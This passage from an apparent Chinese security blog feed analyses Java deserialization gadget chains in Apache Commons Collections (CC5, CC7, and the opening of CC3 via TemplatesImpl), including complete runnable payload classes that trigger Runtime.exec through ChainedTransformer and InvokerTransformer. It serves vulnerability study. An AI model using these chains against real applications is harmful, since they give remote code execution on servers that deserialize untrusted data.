org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC5 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;)</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 利用 LazyMap 的 get 方法执行 ChainedTransformer 的 transform 方法</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用 TiedMapEntry 的 toString 方法执行 LazyMap 的 get 方法</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 利用 BadAttributeValueExpException 的 readObject 方法执行 TiedMapEntry 的 toString 方法</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">        // 反射设置 val ，不在构造方法中设置 val 是为了避免提前代码执行</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7-链"><a href="#CC7-链" class="headerlink" title="CC7 链"></a>CC7 链</h2><p>CC7 链将 Hashtable#readObject() 作为入口，利用 AbstractMap#equals() 来调用 LazyMap#get() ，进而调用 transform 方法。</p><h4 id="利用链之-AbstractMap"><a href="#利用链之-AbstractMap" class="headerlink" title="利用链之 AbstractMap"></a>利用链之 AbstractMap</h4><p>AbstractMap 的 equals 方法调用了 m 的 get 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object o) &#123;</span><br><span class="line">    if (o == this)</span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    if (!(o instanceof Map))</span><br><span class="line">        return false;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    if (m.size() != size())</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        while (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            if (value == null) &#123;</span><br><span class="line">                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (!value.equals(m.get(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (ClassCastException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; catch (NullPointerException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看 m 在 equals 方法中的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br></pre></td></tr></table></figure><p>所以只要将传入的 o 设置成 LazyMap 对象就好了。</p><h4 id="利用链之-AbstractMapDecorator"><a href="#利用链之-AbstractMapDecorator" class="headerlink" title="利用链之 AbstractMapDecorator"></a>利用链之 AbstractMapDecorator</h4><p>AbstractMapDecorator 的 equals 方法会调用 map 的 equals 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object object) &#123;</span><br><span class="line">    if (object == this) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>map 是 AbstractMapDecorator 中定义的成员属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected transient Map map;</span><br></pre></td></tr></table></figure><p>在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public AbstractMapDecorator(Map map) &#123;</span><br><span class="line">    if (map == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;Map must not be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.map = map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以将 map 赋值成 AbstractMap 对象。</p><h4 id="入口类之-Hashtable"><a href="#入口类之-Hashtable" class="headerlink" title="入口类之 Hashtable"></a>入口类之 Hashtable</h4><p>Hashtable 的 reconstitutionPut 方法调用了 e.key.equals() ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="line">    throws StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    if (value == null) &#123;</span><br><span class="line">        throw new java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    // Makes sure the key is not already in the hashtable.</span><br><span class="line">    // This should not happen in deserialized version.</span><br><span class="line">    int hash = key.hashCode();</span><br><span class="line">    int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;</span><br><span class="line">        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            throw new java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // Creates the new entry.</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意几个点：</p><p>一是 value 需要不为空，否则抛出异常；</p><p>二是 for 循环中的 if 判断条件 (e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key) ，使用 &amp;&amp; 符号，具有短路特性，也就是说只有左边的式子返回 true ，右边的式子才会执行。</p><p>Hashtable 的 value 属性可以通过 put 方法赋值；</p><p>要调用到 e.key.equals() 我们需要保证 e.key 是一个 AbstractMapDecorator 对象，但是 AbstractMapDecorator 是一个抽象类，并不能直接 new 对象，已知 LazyMap 继承了 AbstractMapDecorator 这个抽象类，所以可以考虑将 e.key 赋值为 LazyMap 对象；</p><p>e 是传入的参数 Entry<?,?>[] tab 数组的某一个键值对，想知道这个 tab 是什么，还得往后看。</p><p>Hashtable 的 readObject 方法调用了 reconstitutionPut 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">     throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    // Read in the length, threshold, and loadfactor</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read the original length of the array and number of elements</span><br><span class="line">    int origlength = s.readInt();</span><br><span class="line">    int elements = s.readInt();</span><br><span class="line"></span><br><span class="line">    // Compute new size with a bit of room 5% to grow but</span><br><span class="line">    // no larger than the original size.  Make the length</span><br><span class="line">    // odd if it&#x27;s large enough, this helps distribute the entries.</span><br><span class="line">    // Guard against the length ending up zero, that&#x27;s not valid.</span><br><span class="line">    int length = (int)(elements * loadFactor) + (elements / 20) + 3;</span><br><span class="line">    if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)</span><br><span class="line">        length--;</span><br><span class="line">    if (origlength &gt; 0 &amp;&amp; length &gt; origlength)</span><br><span class="line">        length = origlength;</span><br><span class="line">    table = new Entry&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);</span><br><span class="line">    count = 0;</span><br><span class="line"></span><br><span class="line">    // Read the number of elements and then all the key/value objects</span><br><span class="line">    for (; elements &gt; 0; elements--) &#123;</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        // synch could be eliminated for performance</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到传入 reconstitutionPut 方法的第一个参数是 table ，table 是 Hashtable 中定义的一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private transient Entry&lt;?,?&gt;[] table;</span><br></pre></td></tr></table></figure><p>这个属性被 transient 修饰，不能参加序列化，也就是说反序列化通过 Hashtable 的 readObject 方法第一次调用 reconstitutionPut 方法时，table 至少是没有值的。</p><p>再放一遍 reconstitutionPut 代码：</p><img src="/images/image-20240603145606511.png"><p>回到前面的问题，第一次调用 reconstitutionPut 方法时 table 为空，故而 for 循环中取到的 e 为空，直接跳出 for 循环，进行后面的赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br></pre></td></tr></table></figure><p>这里调用了 Entry 的构造方法，会将其成员属性 hash 赋值为前面调用 key.hashCode() 算出来的 hash 值。</p><p>Entry 是 Hashtable 中的一个静态内部类，其构造方法如下：</p><img src="/images/image-20240603144348816.png"><p>第一次 reconstitutionPut 方法被调用完后，会回到 readObject 方法的循环中，Hashtable 中的键值对有多少个，这个 for 循环就执行多少次，reconstitutionPut 方法就被调用多少次，那么如果在 Hashtable 中放入两个 LazyMap 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashtable.put(lazyMap1, &quot;test&quot;);</span><br><span class="line">hashtable.put(lazyMap2, &quot;test&quot;);</span><br></pre></td></tr></table></figure><p>reconstitutionPut 方法自然会执行两次，第二次调用时，tab[index] 就有值了，且只有一个值，就是 lazyMap1 &#x3D;&gt; “test” ，我们又知道，hash 是调用 key.hashCode() 得到的，lazyMap1.hashCode() 会调用其父类 AbstractMapDecorator 的 hashCode() 方法，并最终会调用其成员属性 map 的 hashCode() 方法。</p><p>若 map 是 HashMap 对象，则会调用 HashMap 的 hashCode() 方法，这个方法在其静态内部类 Node&lt;K,V&gt; 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public final int hashCode() &#123;</span><br><span class="line">    return Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，HashMap 的 hashCode() 方法是分别计算其 key 的 hash 和 value 的 hash 再相乘得到的。</p><p>接下来需要使判断 <code>e.hash == hash</code> 返回 true ，即使 <code>lazyMap1.hashCode() == lazyMap2.hashCode()</code> 成立。但是 lazyMap1 与 lazyMap2 又不能完全一样，因为 hashtable.put 在往 hashtable 对象里添加键值对的时候，如果键一样的话，会将值替换掉，如果 lazyMap1 与 lazyMap2 完全一样，那么第二个 put 就只会做替换，这样 hashtable 对象里面就仍然只有一个键值对。</p><p> 所以这里我们沿用前辈们的思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line">lazyMap2.put(&quot;zZ&quot;, 1);</span><br></pre></td></tr></table></figure><p>由于 “yy” 与 “zZ” 算出来的 hash 值一样，所以这样设置好两个 LazyMap 对象中的 map 属性之后，hashCode() 方法得出来的结果是一样的。</p><p>最后一点就是，hashtable 的 put 方法会提前调用 equals 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public synchronized V put(K key, V value) &#123;</span><br><span class="line">    // Make sure the value is not null</span><br><span class="line">    if (value == null) &#123;</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Makes sure the key is not already in the hashtable.</span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    int hash = key.hashCode();</span><br><span class="line">    int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    for(; entry != null ; entry = entry.next) &#123;</span><br><span class="line">        if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            return old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细观察上述代码，发现跟 reconstitutionPut 方法很像，所以为了防止提前命令执行，先传入一个空的 Transformer 到 LazyMap 即可。</p><p>有了上述的结论，就可以开始书写 payload 了。</p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC7 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;)</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        // 先传入空的 Transformer 数组，防止 put 时命令执行</span><br><span class="line">        Transformer[] transformers1 = new Transformer[]&#123;&#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers1);</span><br><span class="line"></span><br><span class="line">        // 新建两个 HashMap 作为传入的参数</span><br><span class="line">        Map innerMap1 = new HashMap();</span><br><span class="line">        Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">        // 新建两个 LazyMap ，确保 hashCode() 结果一样</span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">        // 新建入口类 Hashtable</span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, &quot;test1&quot;);</span><br><span class="line">        hashtable.put(lazyMap2, &quot;test2&quot;);</span><br><span class="line"></span><br><span class="line">        // 通过反射设置 transformer 数组</span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span><br><span class="line">        lazyMap2.remove(&quot;yy&quot;);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用栈总结-3"><a href="#调用栈总结-3" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><p>梳理调用栈之前，先知道两件事：</p><ul><li>LazyMap 继承了 AbstractMapDecorator</li><li>HashMap 继承了 AbstractMap</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject()</span><br><span class="line">-&gt;Hashtable#reconstitutionPut()</span><br><span class="line">-&gt;Hashtable#reconstitutionPut()</span><br><span class="line">LazyMap#equals() -- 即 AbstractMapDecorator#equals()</span><br><span class="line">HashMap#equals() -- 即 AbstractMap#equals()</span><br><span class="line">LazyMap#get()</span><br><span class="line">ChainedTransformer#transform()</span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">                        Runtime#exec()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/9409?time__1311=n4+xuDgD9AYCqAKGQ3DsD7feyK4AxxnAxbD&alichlgref=https://www.google.com/">CC链 1-7 分析</a> </p><p><a href="https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4">https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CC4-链&quot;&gt;&lt;a href=&quot;#CC4-链&quot; class=&quot;headerlink&quot; title=&quot;CC4 链&quot;&gt;&lt;/a&gt;CC4 链&lt;/h2&gt;&lt;p&gt;在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Java 反序列化之 CC3 链</title>
    <link href="https://changeyourway.github.io/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-05-27T02:55:47.408Z</published>
    <updated>2024-09-12T06:30:23.451Z</updated>
    
    <content type="html"><![CDATA[<p>CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。</p><span id="more"></span><h2 id="CC3-链分析"><a href="#CC3-链分析" class="headerlink" title="CC3 链分析"></a>CC3 链分析</h2><p>在分析 CC3 链之前，我们需要再深入地了解一下 Java 的类加载机制。虽然我前面有提到 Java 类加载的几种方式，但是这里还是需要再深入了解一下。</p><p>推荐博客：<a href="https://www.cnblogs.com/1vxyz/p/17245206.html">Java 基础篇-类加载机制</a> </p><p>​   <a href="https://www.cnblogs.com/caicz/p/12718026.html">ClassLoader，吃透它看这一篇就够了</a> </p><h4 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><p>实现一个自定义类加载器需要继承 ClassLoader ，同时覆盖 findClass 方法。</p><p>ClassLoader 里面有三个重要的方法 loadClass() 、findClass() 和 defineClass() 。</p><p>loadClass() 方法是加载目标类的入口，它首先会查找当前 ClassLoader 以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载，如果双亲都加载不了，就会调用 findClass() 让自定义加载器自己来加载目标类。ClassLoader 的 findClass() 方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码。拿到这个字节码之后再调用 defineClass() 方法将字节码转换成 Class 对象。</p><h4 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h4><p>想要自定义类加载器，一定需要了解双亲委派模型</p><p>双亲委派机制原理如下：</p><p>类加载器根据全限定类名判断类是否加载，如果已经加载则直接返回已加载类。如果没有加载，类加载器会首先委托父类加载器加载此类。父类加载器也会采用相同的策略，查看是否自己已经加载该类，如果有就返回，没有就继续委托给父类进行加载，直到<code>BootStrapClassLoader</code>。如果父类加载器无法加载，就会交给子类进行加载，如果还不能加载就继续交给子类加载。顺序为 <code>BootStrapClassLoader-&gt;ExtClassLoader-&gt;AppClassLoader-&gt;自定义类加载器</code> 。</p><p>双亲委派机制的好处：</p><p>能够有效确保一个类的全局唯一性，当程序中出现多个限定名相同的类时，类加载器在执行加载时，始终只会加载其中的某一个类。加载的先后顺序其实确定了类被加载的优先级，如果出现了限定名相同的类，类加载器在执行加载时只会加载优先级最高的那个类。</p><h4 id="利用链之-TemplatesImpl-类"><a href="#利用链之-TemplatesImpl-类" class="headerlink" title="利用链之 TemplatesImpl 类"></a>利用链之 TemplatesImpl 类</h4><p>TemplatesImpl 类中的静态内部类 TransletClassLoader 就是一个自定义类加载器，它继承了 ClassLoader ，重写了 defineClass 方法。defineClass() 完成类加载的加载 -&gt; 验证 -&gt; 准备 -&gt; 解析四个阶段，而静态代码块在初始化阶段被执行。所以可以把命令放在静态代码块中，最后利用 newInstance 方法完成初始化并执行它。</p><h6 id="利用链总结"><a href="#利用链总结" class="headerlink" title="利用链总结"></a>利用链总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>TransletClassLoader 静态内部类的 defineClass 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class defineClass(final byte[] b) &#123;</span><br><span class="line">    return 